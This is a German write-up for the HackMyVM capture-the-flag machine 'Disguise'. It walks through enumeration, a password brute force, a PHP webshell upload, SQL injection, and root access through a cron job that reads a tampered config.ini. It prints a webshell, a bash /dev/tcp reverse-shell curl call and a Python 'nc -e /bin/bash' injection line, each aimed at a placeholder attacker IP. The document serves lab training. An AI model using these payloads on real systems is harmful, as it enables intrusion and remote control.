# Disguise - HackMyVM Lösungsweg

![Disguise VM Icon](Disguise.png)

Dieses Repository enthält einen Lösungsweg (Walkthrough) für die HackMyVM-Maschine "Disguise".

## Details zur Maschine & zum Writeup

*   **VM-Name:** Disguise
*   **VM-Autor:** DarkSpirit
*   **Plattform:** HackMyVM
*   **Schwierigkeitsgrad (laut Writeup):** Schwer (Hard)
*   **Link zur VM:** [https://hackmyvm.eu/machines/machine.php?vm=Disguise](https://hackmyvm.eu/machines/machine.php?vm=Disguise)
*   **Autor des Writeups:** DarkSpirit
*   **Original-Link zum Writeup:** [https://alientec1908.github.io/Disguise_HackMyVM_Hard/](https://alientec1908.github.io/Disguise_HackMyVM_Hard/)
*   **Datum des Originalberichts:** 02. Mai 2025

## Verwendete Tools (Auswahl)

*   `arp-scan`
*   `nmap`
*   `nikto`
*   `curl`
*   `jq`
*   `gobuster`
*   `wfuzz`
*   `wpscan`
*   `hydra`
*   `mysql` (Client)
*   `sqlmap`
*   `nc` (netcat)
*   `python3` (insb. `http.server`, `pty.spawn`)
*   `wget`
*   `chmod`
*   `find`
*   `pspy64`
*   `crunch`
*   `suForce`
*   Standard Linux-Befehle (`ls`, `cat`, `sudo`, `echo`, `export`, etc.)

## Zusammenfassung des Lösungswegs

Das Folgende ist eine gekürzte Version der Schritte, die unternommen wurden, um die Maschine zu kompromittieren, basierend auf dem bereitgestellten Writeup.

### 1. Reconnaissance (Aufklärung)

*   Die Ziel-IP `192.168.2.189` wurde mittels `arp-scan` identifiziert.
*   Ein `nmap`-Scan ergab offene Ports:
    *   **Port 22/tcp (SSH):** OpenSSH 7.9p1 Debian 10+deb10u4.
    *   **Port 80/tcp (HTTP):** Apache httpd 2.4.59 (Debian). Nmap identifizierte die Seite als **WordPress 6.7.2** (später als 6.8.1 von WPScan) unter `disguise.hmv`.
*   Die Hostnamen `disguise.hmv` und später `dark.disguise.hmv` wurden der IP `192.168.2.189` in der `/etc/hosts`-Datei des Angreifers zugeordnet.

### 2. Web Enumeration (Web-Aufklärung)

#### Hauptdomain: `disguise.hmv` (WordPress)
*   `nikto` fand Standard-WordPress-Pfade und fehlende Security-Header.
*   Die `robots.txt` zeigte `/wp-admin/`.
*   Über die WordPress REST API (`/wp-json/wp/v2/users/1`) wurde der Benutzer **"simpleAdmin"** enumeriert.
*   `wpscan` identifizierte WordPress-Versionen, Plugins und Themes mit potenziellen Schwachstellen (z.B. in "akismet", "newsblogger", "newscrunch"). Insbesondere "newsblogger" und "newscrunch" zeigten "Authenticated Arbitrary File Upload"-Schwachstellen.

#### Subdomain: `dark.disguise.hmv` (Benutzerdefinierte PHP-Anwendung)
*   `wfuzz` wurde verwendet, um Subdomains zu finden und entdeckte **`dark.disguise.hmv`**.
*   `gobuster` auf `dark.disguise.hmv` fand eine andere Anwendungsstruktur mit `login.php`, `register.php`, `config.php` (Size 0), `functions.php` (Size 0) und einem `/manager/`-Verzeichnis.
*   `nikto` auf `dark.disguise.hmv` meldete:
    *   Fehlende Security-Header.
    *   `PHPSESSID`-Cookie ohne `HttpOnly`-Flag.
    *   Einen verdächtigen Pfad `/database.tar.bz2` (der manuell geprüft werden musste).
    *   Hinweis auf `config.php` als potenzielle Quelle für Datenbankzugangsdaten.
*   Im Quelltext von `dark.disguise.hmv/index.php` wurde ein `image_handler.php?id=X` Endpunkt entdeckt, der auf eine mögliche LFI-Schwachstelle hindeutete.
*   Ein gültiges `dark_session`-Cookie wurde (vermutlich durch vorherigen Login oder Exploit) erlangt, um auf `/profile.php` zuzugreifen.

### 3. Initial Access als `www-data` (auf `dark.disguise.hmv`)

1.  **Passwort für `simpleAdmin` auf `dark.disguise.hmv` gefunden:**
    *   Mit `hydra` wurde ein Brute-Force-Angriff auf `http://dark.disguise.hmv/login.php` durchgeführt.
    *   Passwort für `simpleAdmin` gefunden: `Str0ngPassw0d1@@@`.
2.  **PHP-Webshell-Upload:**
    *   Nach dem Login in den Admin-Bereich (`http://dark.disguise.hmv/manager/`) wurde eine PHP-Webshell (z.B. `<?php system($_GET['cmd']); ?>`) über die Funktion "Produkt hinzufügen" hochgeladen.
3.  **Pfad der Webshell via SQL-Injection ermittelt:**
    *   Mit `sqlmap` wurde eine zeitbasierte Blind-SQL-Injection-Schwachstelle im Parameter `description` der `add_product.php`-Funktion (unter Verwendung des `dark_session`-Cookies) ausgenutzt.
    *   Die SQL-Abfrage `SELECT image FROM dark_shop.products ORDER BY id DESC LIMIT 1` wurde ausgeführt, um den Pfad zur hochgeladenen Webshell zu extrahieren (z.B. `images/c76bf961f084a3c713329bd86ef761ba.php`).
4.  **Reverse Shell als `www-data` etabliert:**
    *   Ein Netcat-Listener wurde auf der Angreifer-Maschine gestartet (z.B. `nc -lvnp 4444`).
    *   Die Webshell wurde via `curl` aufgerufen und ein Bash-Reverse-Shell-Payload übergeben:
        ```bash
        curl "http://dark.disguise.hmv/WEBSHELL_PFAD.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/ANGREIFER_IP/4444%200%3E%261'"
        ```
    *   Erfolgreiche Verbindung und Shell als Benutzer `www-data`.

### 4. Privilege Escalation (Privilegienerweiterung zu `root`)

1.  **Enumeration als `www-data`:**
    *   Im Home-Verzeichnis `/home/darksoul/` wurde die Datei `config.ini` gefunden, die MySQL-Zugangsdaten enthielt: `dark_db_admin:Str0ngPassw0d1***` für die Datenbank `dark_shop`.
    *   Ein Python-Skript `/opt/query.py` wurde gefunden, das diese Datenbank abfragt.
    *   Mit `pspy64` wurde ein Cronjob identifiziert, der `/opt/query.py` als `root` unter Verwendung von `/home/darksoul/config.ini` ausführt.
2.  **Kompromittierung des Benutzers `darksoul`:**
    *   Mit `crunch` wurde eine gezielte Wortliste basierend auf dem Muster des `simpleAdmin`-Passworts erstellt.
    *   Mit dem Tool `suForce` wurde das Passwort für den Systembenutzer `darksoul` als `Str0ngPassw0d1???` ermittelt.
3.  **Ausnutzung des Root-Cronjobs (MySQL Connector Exploit):**
    *   Als Benutzer `darksoul` (nach `su darksoul` mit dem gefundenen Passwort) wurde die Datei `/home/darksoul/config.ini` manipuliert.
    *   Die originale `config.ini` (Eigentümer `root`) wurde gelöscht und eine neue `config.ini` (Eigentümer `darksoul`) mit den originalen Datenbankparametern und einer zusätzlichen bösartigen Zeile erstellt:
        ```ini
        [client]
        user = dark_db_admin
        password = Str0ngPassw0d1***
        host = localhost
        database = dark_shop
        port = int(3306)
        allow_local_infile=__import__('os').system('nc -e /bin/bash ANGREIFER_IP 4448')
        ```
    *   Ein Netcat-Listener wurde auf der Angreifer-Maschine auf Port `4448` gestartet.
    *   Als der Cronjob das nächste Mal `/opt/query.py` als `root` ausführte und die manipulierte `config.ini` las, interpretierte `mysql.connector` die `allow_local_infile`-Option und führte den eingebetteten Python-Code (`os.system(...)`) als `root` aus.
    *   Dies baute eine Reverse Shell zum Angreifer auf und lieferte Root-Rechte.

### 5. Flags

*   **User-Flag (`/home/darksoul/user.txt`):**
    ```
    hmv{hiddenflag}
    ```
*   **Root-Flag (`/root/root.txt`):**
    ```
    hmv{CVE-2025-21548} 
    ```
    *(Der Name der Root-Flag bezieht sich auf die (fiktive) CVE, die im Zusammenhang mit der `allow_local_infile`-Schwachstelle im `mysql.connector` steht.)*

## Haftungsausschluss (Disclaimer)

Dieser Lösungsweg dient zu Bildungszwecken und zur Dokumentation der Lösung für die "Disguise" HackMyVM-Maschine. Die Informationen sollten nur in ethischen und legalen Kontexten verwendet werden, wie z.B. bei CTFs und autorisierten Penetrationstests.
